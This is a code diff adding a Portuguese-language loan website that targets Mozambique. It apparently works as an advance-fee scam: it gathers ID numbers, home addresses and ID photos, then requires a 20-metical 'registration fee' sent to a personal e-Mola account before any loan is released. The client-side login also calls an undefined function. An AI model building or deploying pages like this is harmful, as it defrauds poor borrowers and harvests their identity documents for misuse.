@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- Dentro do <head> -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <title>Empréstimo Rápido MZ — Aprovação em minutos</title>
+  <meta name="description" content="Solicite empréstimo rápido em Moçambique. Simulador, formulário seguro, login/cadastro, e fluxo com taxa de inscrição.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --primary:#16a34a; --primary-dark:#15803d;
+      --bg:#0b1220; --card:#0f172a; --muted:#94a3b8;
+      --radius:1.2rem; --header-h:64px;
+    }
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial;background:var(--bg);color:#e5e7eb;scroll-behavior:smooth}
+    a{color:#22d3ee;text-decoration:none}
+    .container{max-width:1100px;margin:0 auto;padding:24px}
+
+    /* ===== Header ===== */
+    header{position:sticky;top:0;z-index:50;background:rgba(11,18,32,.85);backdrop-filter:blur(8px);border-bottom:1px solid rgba(148,163,184,.12)}
+    .nav{display:flex;align-items:center;justify-content:space-between;gap:16px;min-height:var(--header-h)}
+    .brand{display:flex;align-items:center;gap:10px}
+    .logo{width:36px;height:36px;border-radius:12px;background:linear-gradient(135deg,var(--primary),#22d3ee);display:grid;place-items:center;font-weight:900;color:#0b1220}
+    .brand h1{font-size:18px;margin:0}
+    .navlinks{display:flex;gap:10px;align-items:center}
+    .navlinks a{padding:10px 14px;border-radius:12px;border:1px solid transparent;color:#cbd5e1}
+    .navlinks a:hover{background:#0b1327;border-color:rgba(148,163,184,.2)}
+    .navlinks a.active{background:#0b1327;border-color:rgba(148,163,184,.35)}
+    .btn-primary{background:var(--primary);color:#071427;font-weight:800;border-radius:999px;padding:10px 16px}
+    .btn-primary:hover{background:var(--primary-dark)}
+    .user-chip{display:none;align-items:center;gap:8px;padding:8px 12px;border-radius:999px;background:#0b1327;border:1px solid rgba(148,163,184,.2);font-size:14px}
+    .hamburger{display:none;border:1px solid rgba(148,163,184,.2);background:#0b1327;border-radius:10px;padding:10px;cursor:pointer}
+    .hamburger span{display:block;width:20px;height:2px;background:#cbd5e1;margin:4px 0}
+    @media(max-width:780px){
+      .hamburger{display:block}
+      .navlinks{position:absolute;left:0;right:0;top:calc(var(--header-h));display:none;flex-direction:column;background:rgba(11,18,32,.96);padding:10px 16px;border-bottom:1px solid rgba(148,163,184,.12)}
+      .navlinks.open{display:flex}
+      .navlinks a{width:100%}
+      .user-chip{width:100%;justify-content:flex-start}
+    }
+
+    /* ===== Layout / Cards ===== */
+    .hero{display:grid;grid-template-columns:1.1fr .9fr;gap:28px;align-items:center;padding:32px 0}
+    .hero h2{font-size:36px;line-height:1.1;margin:0 0 10px}
+    .hero p{color:var(--muted);margin:0 0 18px}
+    .badges{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0}
+    .badge{font-size:12px;border:1px solid rgba(148,163,184,.25);color:#cbd5e1;padding:8px 10px;border-radius:999px}
+    .card{background:var(--card);border:1px solid rgba(148,163,184,.1);border-radius:var(--radius);box-shadow:0 10px 30px rgba(2,8,23,.35)}
+    .card.pad{padding:18px}
+    .grid{display:grid;gap:18px}
+    .grid.cols-3{grid-template-columns:repeat(3,1fr)}
+    .grid.cols-2{grid-template-columns:repeat(2,1fr)}
+    @media(max-width:800px){.hero{grid-template-columns:1fr}.grid.cols-3{grid-template-columns:1fr}.grid.cols-2{grid-template-columns:1fr}}
+
+    /* Forms */
+    label{display:block;font-weight:600;margin:10px 0 6px}
+    input,select,textarea{width:100%;padding:12px 12px;border-radius:12px;border:1px solid rgba(148,163,184,.2);background:#0b1327;color:#e5e7eb}
+    input::placeholder,textarea::placeholder{color:#94a3b86e}
+    .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    @media(max-width:600px){.row{grid-template-columns:1fr}}
+    .actions{display:flex;gap:10px;flex-wrap:wrap}
+    .btn{display:inline-flex;align-items:center;justify-content:center;padding:12px 16px;border-radius:12px;border:1px solid rgba(148,163,184,.18);background:#0b1327;color:#e5e7eb;font-weight:600;cursor:pointer}
+    .btn.ghost:hover{background:#0d1b35}
+    .hint{font-size:12px;color:var(--muted)}
+    .pill{padding:8px 10px;border-radius:999px;background:#0b1327;border:1px solid rgba(148,163,184,.18);font-size:12px;color:#cbd5e1}
+
+    section{padding:26px 0}
+    .section-title{display:flex;align-items:center;justify-content:space-between;margin:0 0 12px}
+    .section-title h3{margin:0;font-size:22px}
+
+    .steps{display:flex;gap:12px;flex-wrap:wrap}
+    .step{flex:1;min-width:220px;padding:16px;border-radius:16px;border:1px dashed rgba(148,163,184,.25)}
+    .step b{display:block}
+
+    .kv{display:grid;grid-template-columns:1fr auto;gap:8px;font-size:14px}
+    .kv div{padding:8px 10px;border-radius:10px;background:#0b1327;border:1px solid rgba(148,163,184,.12)}
+    .kv .k{color:#cbd5e1}
+    .kv .v{color:#93c5fd}
+
+    .toast{position:fixed;right:18px;bottom:18px;background:#071427;border:1px solid rgba(148,163,184,.2);padding:12px 14px;border-radius:12px;display:none;box-shadow:0 10px 30px rgba(2,8,23,.45)}
+
+    .overlay{position:fixed;inset:0;background:rgba(2,8,23,.65);display:none;align-items:center;justify-content:center;padding:16px}
+    .modal{max-width:620px;width:100%}
+
+    footer{margin:30px 0 10px;color:var(--muted);text-align:center}
+    .divider{height:1px;background:linear-gradient(90deg,transparent,rgba(148,163,184,.3),transparent);margin:16px 0}
+
+    .page{display:none}
+    .page.active{display:block}
+
+    /* Processing overlay */
+    #processing{gap:12px;flex-direction:column;color:#cbd5e1;text-align:center}
+    .spinner{width:42px;height:42px;border-radius:999px;border:3px solid rgba(148,163,184,.2);border-top-color:#22d3ee;animation:spin 1s linear infinite;margin:0 auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .warn{background:#1a2236;border:1px solid rgba(255,193,7,.35);color:#fde68a;padding:10px 12px;border-radius:10px;margin-top:8px}
+
+    /* ===== Slider ===== */
+    .slider{position:relative;overflow:hidden;border-radius:var(--radius);height:320px;border:1px solid rgba(148,163,184,.1)}
+    @media(max-width:800px){.slider{height:240px;margin-top:12px}}
+    .slides{display:flex;width:100%;height:100%;transition:transform .6s ease}
+    .slide{min-width:100%;height:100%;position:relative}
+    .slide img{width:100%;height:100%;object-fit:cover;display:block}
+    .caption{
+      position:absolute;left:12px;bottom:12px;max-width:85%;
+      background:rgba(2,8,23,.55);backdrop-filter:blur(3px);
+      border:1px solid rgba(148,163,184,.25);border-radius:12px;padding:10px 12px
+    }
+    .caption b{display:block;font-size:16px}
+    .dots{position:absolute;left:50%;bottom:10px;transform:translateX(-50%);display:flex;gap:6px}
+    .dot{width:8px;height:8px;border-radius:999px;border:none;background:rgba(148,163,184,.5);cursor:pointer}
+    .dot.active{background:#22d3ee}
+    .arrow{
+      position:absolute;top:50%;transform:translateY(-50%);border:none;cursor:pointer;
+      width:36px;height:36px;border-radius:999px;background:rgba(2,8,23,.5);color:#e5e7eb;
+      border:1px solid rgba(148,163,184,.25);display:grid;place-items:center;font-size:18px
+    }
+    .arrow:hover{background:rgba(2,8,23,.7)}
+    .arrow.prev{left:10px}.arrow.next{right:10px}
+   /* Seção de pagamentos */
+.pagamentos {
+  text-align: center;
+  padding: 20px 10px;
+}
+
+.pagamentos .logos {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 40px;
+  margin-top: 15px;
+}
+
+.pagamentos .logos div {
+  text-align: center;
+}
+
+.pagamentos img {
+  width: 80px;
+  height: auto;
+  display: block;
+  margin: 0 auto 5px;
+}
+
+/* Rodapé de pagamentos fixo */
+.footer-pagamentos-fixo {
+  position: fixed;
+  bottom: 60px;        /* Ajuste conforme altura do rodapé principal */
+  left: 0;
+  width: 100%;
+  background: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 10px 0;
+  box-shadow: 0 -2px 5px rgba(0,0,0,0.2);
+  z-index: 1000;
+}
+
+.footer-pagamentos-fixo div {
+  margin: 0 20px;
+  text-align: center;
+}
+
+.footer-pagamentos-fixo img {
+  width: 50px; 
+  height: auto;
+  display: block;
+  margin: 0 auto 5px;
+}
+
+.footer-pagamentos-fixo p {
+  margin: 0;
+  font-size: 14px;
+}
+
+/* Rodapé principal */
+.rodape-principal {
+  text-align: center;
+  padding: 15px 10px;
+  background: #222;
+  color: #fff;
+}
+  </style>
+</head>
+<body>
+  <!-- ======= AUTH GATE ======= -->
+  <div id="authGate" style="position:fixed;inset:0;display:none;align-items:center;justify-content:center;padding:20px;background:radial-gradient(1200px 600px at 50% -10%, rgba(34,197,94,.25), transparent 60%), #071018">
+    <div class="card pad" style="max-width:420px;width:100%">
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">
+        <div class="logo">ER</div>
+        <div>
+          <div style="font-weight:800">Empréstimo Rápido</div>
+          <div class="hint">Acesse sua conta para continuar</div>
+        </div>
+      </div>
+      <div style="display:flex;gap:8px;margin-bottom:12px">
+        <button id="tabEntrar" class="btn" style="flex:1;background:#0b1327">Entrar</button>
+        <button id="tabCadastrar" class="btn" style="flex:1;background:#0b1327">Cadastrar</button>
+      </div>
+      <div id="formEntrar">
+        <label>Email</label><input id="loginEmail" type="email" placeholder="voce@email.com">
+        <label>Senha</label><div style="position:relative"><input id="loginSenha" type="password" placeholder="••••••••"><button class="btn" id="togglePwLogin" type="button" style="position:absolute;right:6px;top:6px;padding:6px 8px">Mostrar</button></div>
+        <label style="display:flex;align-items:center;gap:8px;margin:6px 0"><input type="checkbox" id="lembrar"> Lembrar-me neste dispositivo</label>
+        <div class="actions"><button class="btn btn-primary" id="btnDoLogin">Entrar</button><button class="btn" id="btnToRegister">Quero me cadastrar</button></div>
+      </div>
+      <div id="formCadastrar" style="display:none">
+        <label>Nome completo</label><input id="cadNome" placeholder="Seu nome">
+        <label>Email</label><input id="cadEmail" type="email" placeholder="voce@email.com">
+        <label>Senha</label><div style="position:relative"><input id="cadSenha" type="password" placeholder="Mínimo 6 caracteres"><button class="btn" id="togglePwCad" type="button" style="position:absolute;right:6px;top:6px;padding:6px 8px">Mostrar</button></div>
+        <div class="actions"><button class="btn btn-primary" id="btnDoCadastro">Cadastrar</button><button class="btn" id="btnToLogin">Já tenho conta</button></div>
+      </div>
+      <p class="hint" style="margin-top:8px"></p>
+    </div>
+  </div>
+
+  <!-- ======= APP ======= -->
+  <div id="app" style="display:none">
+    <header>
+      <div class="container nav">
+        <div class="brand">
+          <button class="hamburger" id="menuToggle" aria-label="Abrir menu" aria-expanded="false" aria-controls="mainNav"><span></span><span></span><span></span></button>
+          <div class="logo">ER</div>
+          <h1>Empréstimo Rápido</h1>
+        </div>
+        <nav class="navlinks" id="mainNav">
+          <a href="#home">Início</a>
+          <a href="#simulador">Simulador</a>
+          <a href="#beneficios">Como funciona</a>
+          <a href="#sobre">Sobre</a>
+          <a href="#faq">FAQ</a>
+          <a href="#politica">Política</a>
+          <a href="#termos">Termos</a>
+          <a href="#form" class="btn-primary">Solicitar</a>
+          <span class="user-chip" id="userChip">Olá! seja bem vindo</span>
+          <a id="btnLogout" class="btn" href="#" title="Sair">Sair</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <!-- HOME -->
+      <section id="home" class="page active">
+        <div class="hero">
+          <!-- Coluna esquerda (texto) -->
+          <div>
+            <div class="badges"><span class="badge">Aprovação em minutos*</span><span class="badge">Sem fila • 100% online</span><span class="badge">Atendimento WhatsApp</span></div>
+            <h2>Crédito rápido e transparente para o que importa agora.</h2>
+            <p>Simule, envie seus dados e receba a análise de forma segura. Atendemos Moçambique (MZN).</p>
+            <div class="actions"><a class="btn btn-primary" href="#simulador">Fazer simulação</a><a class="btn" id="whatsHero" target="_blank" rel="noopener">Falar no WhatsApp</a></div>
+            <p class="hint" style="margin-top:8px">*Sujeito à análise de crédito e documentação.</p>
+          </div>  
+        <!-- Coluna direita (slider) -->
+          <div>
+            <div class="slider card" id="heroSlider">
+              <div class="slides" id="heroSlides"></div>
+              <button class="arrow prev" aria-label="Anterior">‹</button>
+              <button class="arrow next" aria-label="Próximo">›</button>
+              <div class="dots" id="heroDots"></div>
+            </div>
+          </div>
+        </div>
+      </section>
+        <!-- ✅ NOVA SECÇÃO DE PAGAMENTOS -->
+  <section class="pagamentos">
+    <h3>Formas de Pagamento Disponíveis</h3>
+    <div class="logos">
+      <div>
+        <img src="https://images.seeklogo.com/logo-png/44/1/m-pesa-logo-png_seeklogo-442995.png" alt="M-Pesa">
+        <p>M-Pesa</p>
+      </div>
+      <div>
+        <img src="https://play-lh.googleusercontent.com/2TGAhJ55tiyhCwW0ZM43deGv4lUTFTBMoq83mnAO6-bU5hi2NPyKX8BN8iKt13irK7Y" alt="eMola">
+        <p>eMola</p>
+      </div>
+    </div>
+  </section>
+
+  <h2>Crédito rápido e transparente</h2>
+  <p>Solicite empréstimo em minutos, receba direto no seu telemóvel.</p>
+</section>
+  
+      <!-- COMO FUNCIONA -->
+      <section id="beneficios" class="page">
+        <div class="section-title"><h3>Como funciona</h3><span class="pill">Simples em 3 passos</span></div>
+        <div class="steps">
+          <div class="step card"><b>1) Simule</b> Informe valor e prazo e veja parcelas estimadas.</div>
+          <div class="step card"><b>2) Envie os dados</b> Preencha o formulário e anexe documentos básicos.</div>
+          <div class="step card"><b>3) Receba o crédito</b> Após análise e assinatura, transferimos via M-Pesa, e-Mola ou conta.</div>
+        </div>
+      </section>
+
+      <div class="divider"></div>
+<section id="simulador" class="page grid cols-2">
+  <div class="card pad">
+    <div class="section-title">
+      <h3>Simulador</h3>
+      <span class="pill" id="simuTag">Selecione a periodicidade</span>
+    </div>
+
+    <label for="valor">Valor desejado (MZN) — máximo 20.000</label>
+    <input id="valor" type="number" min="500" max="20000" step="50" placeholder="Ex: 5.000" value="0">
+
+    <!-- Nova opção de periodicidade -->
+    <label for="periodicidade">Periodicidade do pagamento</label>
+    <select id="periodicidade">
+      <option value="diario" data-taxa="10">Diário (10% a.d.)</option>
+      <option value="semanal" data-taxa="10">Semanal (10% a.s.)</option>
+      <option value="mensal" data-taxa="10" selected>Mensal (10% a.m.)</option>
+    </select>
+
+    <div class="row">
+      <div>
+        <label for="prazo">Prazo</label>
+        <input id="prazo" type="number" min="1" max="31" value="1">
+      </div>
+      <div>
+        <label for="taxa">Taxa (%)</label>
+        <input id="taxa" type="number" min="0" max="1" step="1.5" value="10">
+      </div>
+    </div>
+
+    <div class="actions" style="margin-top:12px">
+      <button class="btn btn-primary" id="btnCalcular">Calcular</button>
+      <button class="btn" id="btnLimpar">Limpar</button>
+    </div>
+  </div>
+
+  <div class="card pad" id="resultado">
+    <div class="section-title">
+      <h3>Resultado</h3>
+      <span class="pill" id="etiquetaPrazo">–</span>
+    </div>
+    <div class="kv" style="margin-top:6px">
+      <div class="k">Parcela estimada</div><div class="v" id="parcela">–</div>
+      <div class="k">Total a pagar</div><div class="v" id="total">–</div>
+      <div class="k">CET aprox.</div><div class="v" id="cet">–</div>
+    </div>
+    <p class="hint" style="margin-top:10px"></p>
+    <div class="actions" style="margin-top:14px">
+      <a class="btn btn-primary" href="#form">Prosseguir com solicitação</a>
+    </div>
+  </div>
+</section>
+
+      <div class="divider"></div>
+
+      <!-- FORMULÁRIO -->
+      <section id="form" class="page grid cols-2">
+        <div class="card pad">
+          <div class="section-title"><h3>Solicitação</h3><span class="pill">Dura ~2 minutos</span></div>
+          <form id="loanForm" novalidate>
+            <label for="nome">Nome completo</label>
+            <input id="nome" name="nome" required placeholder="Como está no BI" />
+
+            <div class="row">
+              <div><label for="bi">BI / Passaporte</label><input id="bi" name="bi" required placeholder="Número do documento" /></div>            </div>
+
+            <div class="row">
+              <div><label for="telefone">Telefone</label><input id="telefone" name="telefone" required placeholder="+258 84xxxxxxx" /></div>
+              <div><label for="email">Email</label><input id="email" name="email" type="email" placeholder="seu@email.com" /></div>
+            </div>
+
+            <label for="endereco">Endereço</label>
+            <input id="endereco" name="endereco" placeholder="Rua/Avenida" />
+
+            <div class="row">
+              <div><label for="numCasa">Número da casa</label><input id="numCasa" name="numCasa" type="text" placeholder="Ex: 123" /></div>
+              <div><label for="quarteirao">Quarteirão</label><input id="quarteirao" name="quarteirao" type="text" placeholder="Ex: 45" /></div>
+            </div>
+
+            <div class="row">
+              <div><label for="bairro">Bairro</label><input id="bairro" name="bairro" type="text" placeholder="seu bairro" /></div>
+              <div>
+                <label for="cidade">Cidade</label>
+                <select id="cidade" name="cidade">
+                  <option>Maputo</option><option>Matola</option><option>Beira</option><option>Nampula</option><option>Quelimane</option><option>Chimoio</option><option>Tete</option><option>Pemba</option><option>Inhambane</option><option>Xai-Xai</option><option>Gurúè</option><option>Maxixe</option>
+                </select>
+              </div>
+            </div>
+
+            <div class="row">
+              <div><label for="valorSolicitado">Valor solicitado (MZN) — máx. 20.000</label><input id="valorSolicitado" name="valorSolicitado" type="number" min="500" required /></div>
+              <div><label for="prazoSolicitado">Prazo (meses)</label>
+                <select id="prazoSolicitado" name="prazoSolicitado"><option>1</option><option>2</option></select>
+              </div>
+            </div>
+
+            <div class="row">
+              <div><label for="plano">Plano de pagamento</label>
+                <select id="plano" name="plano"><option>Mensal</option><option>Semanal</option><option>Diário</option></select>
+              </div>
+              <div><label for="finalidade">Finalidade</label>
+                <select id="finalidade" name="finalidade"><option>Negócio / Capital de giro</option><option>Consolidação de dívidas</option><option>Educação</option><option>Saúde</option><option>Outros</option></select>
+              </div>
+            </div>
+
+            <label>Documento de Identificação</label>
+            <div class="row">
+              <div><input id="biFrente" type="file" accept="image/*,application/pdf" /><span class="hint">BI — frente</span></div>
+              <div><input id="biVerso" type="file" accept="image/*,application/pdf" /><span class="hint">BI — verso</span></div>
+            </div>
+
+            <label class="hint"><input type="checkbox" id="consent" required> Concordo com os termos, política de privacidade e consulta de crédito.</label>
+            <div id="limiteAviso" class="warn" style="display:none">Aviso: o valor máximo permitido é <b>20.000 MZN</b>. Ajuste se possível — ainda pode continuar.</div>
+
+            <div class="actions" style="margin-top:10px"><button class="btn" type="reset">Limpar</button><button class="btn btn-primary" type="submit">Enviar solicitação</button></div>
+          </form>
+        </div>
+
+        <div>
+          <div class="card pad">
+            <h3 style="margin:0 0 8px">Atendimento</h3>
+            <p class="hint">Seg–Sáb • 08h–18h</p>
+            <div class="kv" style="margin-top:8px"><div class="k">WhatsApp</div><div class="v"><a target="_blank" rel="noopener" id="whatsSide"></a></div><div class="k">Email</div><div class="v"><a id="emailSide" href="emprestimorapido@exemplo.com">contato@exemplo.com</a></div><div class="k">Localização</div><div class="v">Maputo/Matola</div></div>
+          </div>
+          <div class="card pad" style="margin-top:18px">
+            <h3 style="margin:0 0 8px">Transparência</h3>
+            <ul style="margin:0 0 0 18px;color:#cbd5e1"><li>Sem custos ocultos; informe-se antes de assinar.</li><li>Pagamentos por  M-Pesa ou e-Mola.</li></ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- SOBRE -->
+      <section id="sobre" class="page">
+        <div class="section-title"><h3>Sobre nós</h3><span class="pill">Confiança & proximidade</span></div>
+        <div class="grid cols-2">  
+          <div class="card pad"><p>Somos uma plataforma especializada em empréstimos rápidos, desenvolvida para quem valoriza tempo, praticidade e transparência. Nosso objetivo é facilitar o acesso ao crédito, oferecendo soluções financeiras seguras e acessíveis em apenas alguns cliques..</p><p class="hint">Licenças e autorizações conforme exigido.</p></div>
+          <div class="card pad"><h4 style="margin:0 0 6px">Nossos valores</h4><ul style="margin:0 0 0 18px;color:#cbd5e1"><li>Transparência em taxas e prazos</li><li>Velocidade com segurança</li><li>Educação financeira</li></ul></div>
+        </div>
+      </section>
+
+      <!-- FAQ -->
+      <section id="faq" class="page">
+        <div class="section-title"><h3>Perguntas frequentes</h3><span class="pill">Tire suas dúvidas</span></div>
+        <div class="grid cols-2">
+          <div class="card pad"><b>Quais documentos preciso?</b><p>BI, NUIT, comprovativos de residência e renda.</p><b>Quanto tempo para aprovação?</b><p>Normalmente em poucas horas úteis.</p></div>
+          <div class="card pad"><b>Como recebo o valor?</b><p>M-Pesa, e-Mola ou conta bancária.</p><b>Posso liquidar antes?</b><p>Sim, solicite o valor de liquidação antecipada.</p></div>
+        </div>
+      </section>
+
+      <!-- POLÍTICA -->
+      <section id="politica" class="page">
+        <div class="section-title"><h3>Política de Privacidade</h3><span class="pill">Resumo</span></div>
+        <div class="card pad"><p>Coletamos dados para análise de crédito e contato. Guardamos de forma segura e nunca vendemos seus dados. Você pode solicitar correção ou exclusão pelo email informado.</p></div>
+      </section>
+
+      <!-- TERMOS -->
+      <section id="termos" class="page">
+        <div class="section-title"><h3>Termos de Uso</h3><span class="pill">Condições básicas</span></div>
+        <div class="card pad"><ul style="margin:0 0 0 18px;color:#cbd5e1"><li>Propostas sujeitas à análise de crédito.</li><li>Simulações são estimativas; condições finais no contrato.</li><li>O uso deste site implica ciência da Política e Termos.</li></ul></div>
+      </section>
+
+      <!-- OVERLAYS / MODAIS -->
+      <div class="overlay" id="processing"><div class="modal card pad"><div class="spinner"></div><h3 style="margin:6px 0 4px;text-align:center">Processando solicitação…</h3><p class="hint">Aguarde cerca de 20 segundos enquanto validamos os dados.</p></div></div>
+
+      <div class="overlay" id="taxaModal">
+        <div class="modal card pad">
+          <h3 style="margin:0 0 6px">Taxa de inscrição — 20 MT</h3>
+          <p>Para concluir a solicitação e receber o valor, efetue o pagamento da <b>taxa de inscrição de 20 Meticais</b>.</p>
+          <div class="card pad" style="margin:10px 0">
+            <b>Por que cobramos a taxa?</b>
+            <ul style="margin:6px 0 0 18px;color:#cbd5e1">
+              <li>Confirmar a identidade do cliente.</li>
+              <li>Garantir seriedade e compromisso na solicitação.</li>
+              <li>Cobrir parte dos custos administrativos.</li>
+            </ul>
+          </div>
+          <div class="kv" style="margin-top:6px">
+            <div class="k">e-Mola</div><div class="v">878128663 (Nome:Artesia Armando )</div>
+          </div>
+          <div class="divider"></div>
+          <h4 style="margin:0 0 6px">Envie o comprovativo do pagamento</h4>
+          <div class="row">
+            <div>
+              <label for="comprovativo">Foto/arquivo do comprovativo</label>
+              <input id="comprovativo" type="file" accept="image/*,application/pdf" />
+              </div>
+            <div>
+              <label for="refPagamento">Referência do pagamento</label>
+              <input id="refPagamento" placeholder="ID/Ref. da transação" />
+            </div>
+          </div>
+          <p class="hint" id="countdown"></p>
+          <div class="actions" style="margin-top:10px">
+            <button class="btn" id="btnFecharTaxa">Fechar</button>
+            <button class="btn btn-primary" id="btnConfirmarPagamento" disabled>Confirmar pagamento</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="overlay" id="reviewModal"><div class="modal card pad"><h3 style="margin:0 0 6px">Estamos a revisar ✅</h3><p>Estamos a revisar os dados do seu pagamento. Receberá o valor do empréstimo em breve, <b>caso os dados de pagamento estejam corretos</b>.</p><div class="actions" style="margin-top:10px"><button class="btn btn-primary" id="btnOkReview">OK</button></div></div></div>
+
+      <div class="toast" id="toast">Campos obrigatórios em falta. Verifique e tente novamente.</div>
+
+      <footer>© <span id="year"></span> Empréstimo Rápido • Todos os direitos reservados • <a href="#politica">Política de Privacidade</a></footer>
+    </main>
+  </div>
+
+  <!-- ==========================
+       CONFIG + APP SCRIPTS
+  =========================== -->
+  <script>
+    /* ==========================
+       CONFIG
+    =========================== */
+    const CONFIG = {
+      WHATSAPP_NUMBER: '258878128663',
+      CONTACT_EMAIL: 'Emprestimo@gmail.com',
+      DEFAULT_TAXA_AM: 1.5,
+      SUBMIT_MODE: 'sheets', // 'email' | 'sheets' | 'api'
+      SHEETS_WEBAPP_URL: 'https://script.google.com/macros/s/FAKE_SHEET_URL/exec',
+      API_ENDPOINT: 'https://api.seu-dominio.mz/leads',
+      EMOLA_NUMBER: '878128663', EMOLA_NAME: 'Emprestimo rapido',
+      TAXA_INSCRICAO: 20, VALOR_MAX: 20000,
+
+      /* >>> TROCA AQUI PELOS TEUS LINKS (podes ter 3, 4, 5… quantos quiser) */
+      SLIDES: [
+        {
+          url: 'https://i0.wp.com/supertoast.pt/wp-content/uploads/2021/04/M-Pesa__.jpg?resize=1280%2C720&ssl=1',
+          titulo: 'Receba via M-Pesa',
+          texto: 'Transferência rápida após aprovação.'
+        },
+        {
+          url: 'https://pbs.twimg.com/media/GWhjkfIaoAEj7fX.jpg',
+          titulo: 'e-Mola disponível',
+          texto: 'Dinheiro no telemóvel em minutos.'
+        },
+        {
+          url: 'https://financeone.com.br/wp-content/uploads/2022/05/calculadora1.jpg',
+          titulo: 'Taxas claras',
+          texto: 'Sem papo furado, 100% transparente.'
+        }
+      ]
+    };
+
+    /* ===== Auth (local) ===== */
+    const AUTH_KEY = 'er_user';
+    const $ = sel => document.querySelector(sel);
+    const $$ = sel => document.querySelectorAll(sel);
+    const fmtMZN = v => (isFinite(v)? v:0).toLocaleString('pt-MZ',{style:'currency',currency:'MZN',maximumFractionDigits:2});
+
+    function setUser(user, persist){ const data = JSON.stringify(user); if(persist) localStorage.setItem(AUTH_KEY, data); else sessionStorage.setItem(AUTH_KEY, data);} 
+    function getUser(){ const data = localStorage.getItem(AUTH_KEY) || sessionStorage.getItem(AUTH_KEY); return data ? JSON.parse(data) : null; }
+    function clearUser(){ localStorage.removeItem(AUTH_KEY); sessionStorage.removeItem(AUTH_KEY); }
+    function isAuth(){ return !!getUser(); }
+    function showAuth(){ $('#authGate').style.display='flex'; $('#app').style.display='none'; }
+    function showApp(){ $('#authGate').style.display='none'; $('#app').style.display='block'; initApp(); if(!location.hash) location.hash='#home'; route(); }
+
+    // Tabs login/cadastro
+    $('#tabEntrar').addEventListener('click',()=>{ styleTabs(true); });
+    $('#tabCadastrar').addEventListener('click',()=>{ styleTabs(false); });
+    function styleTabs(isLogin){
+      $('#tabEntrar').classList.toggle('btn-primary', isLogin);
+      $('#tabCadastrar').classList.toggle('btn-primary', !isLogin);
+      $('#formEntrar').style.display = isLogin ? 'block' : 'none';
+      $('#formCadastrar').style.display = isLogin ? 'none' : 'block';
+    }
+    $('#btnToRegister').addEventListener('click',()=>$('#tabCadastrar').click());
+    $('#btnToLogin').addEventListener('click',()=>$('#tabEntrar').click());
+    const togglePw = (btnId, inputId)=>{ const btn = document.getElementById(btnId), inp = document.getElementById(inputId); btn.addEventListener('click',()=>{ const isPw = inp.type==='password'; inp.type = isPw?'text':'password'; btn.textContent = isPw?'Ocultar':'Mostrar'; });};
+    togglePw('togglePwLogin','loginSenha'); togglePw('togglePwCad','cadSenha');
+
+    $('#btnDoCadastro').addEventListener('click', ()=>{ const nome=$('#cadNome').value.trim(), email=$('#cadEmail').value.trim(), senha=$('#cadSenha').value.trim(); if(!nome||!email||senha.length<6){ alert('Preencha nome, email e senha (mín. 6).'); return;} setUser({nome,email}, true); showApp(); });
+    $('#btnDoLogin').addEventListener('click', ()=>{const email=$('#loginEmail').value.trim();const senha = $('#loginSenha').value.trim();const lembrar = $('#lembrar').checked;if (!email || !senha) {alert('Informe email e senha.');return;}const users = getUsers();const user = users.find(u => u.email === email && u.senha === senha);if (!user) {alert('Email ou senha incorretos.');return;}setUser(user, lembrar);showApp(); });
+    document.addEventListener('click', (e)=>{ if(e.target && e.target.id==='btnLogout'){ e.preventDefault(); clearUser(); showAuth(); }});
+    if(isAuth()) showApp(); else showAuth();
+
+    /* ==========================
+       NAV / ROUTER
+    =========================== */
+    const menuToggle = document.getElementById('menuToggle');
+    const mainNav = document.getElementById('mainNav');
+    menuToggle.addEventListener('click', ()=>{ const open = !mainNav.classList.contains('open'); mainNav.classList.toggle('open'); menuToggle.setAttribute('aria-expanded', String(open)); });
+    document.getElementById('mainNav').addEventListener('click', (e)=>{ const target = e.target.closest('a[href^="#"]'); if(target){ mainNav.classList.remove('open'); menuToggle.setAttribute('aria-expanded','false'); }});
+
+    function bindNavClicks(){
+      $$('#mainNav a[href^="#"]').forEach(a=>{ a.addEventListener('click',(e)=>{ e.preventDefault(); const href=a.getAttribute('href')||'#home'; const target=href.slice(1)||'home'; if(location.hash!==href){ location.hash=href; } route(target); }); });
+    }
+    function route(){ const hash=(location.hash||'#home').replace('#',''); $$('.page').forEach(p=>p.classList.remove('active')); const el=document.getElementById(hash)||document.getElementById('home'); el.classList.add('active'); $$('#mainNav a').forEach(a=>{ a.classList.toggle('active', a.getAttribute('href')===`#${hash}`); }); window.scrollTo({top:0,behavior:'smooth'}); }
+    window.addEventListener('hashchange', route);
+
+    /* ==========================
+       APP INIT & UTIL
+    =========================== */
+    function setContacts(){ const wa=`https://wa.me/${CONFIG.WHATSAPP_NUMBER}`; ['whatsHero','whatsSide'].forEach(id=>{ const a=document.getElementById(id); if(a){ a.href=wa; a.textContent = `+${CONFIG.WHATSAPP_NUMBER}`; }}); const emailA=document.getElementById('emailSide'); if(emailA){ emailA.textContent=CONFIG.CONTACT_EMAIL; emailA.href=`mailto:${CONFIG.CONTACT_EMAIL}`;} const y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear(); }
+    function greetUser(){ const u=getUser(); const chip=$('#userChip'); if(!u){ chip.style.display='none'; return;} const nome=u.nome || (u.email? u.email.split('@')[0] : 'Cliente'); chip.textContent=`Olá, ${nome}`; chip.style.display='inline-flex'; }
+
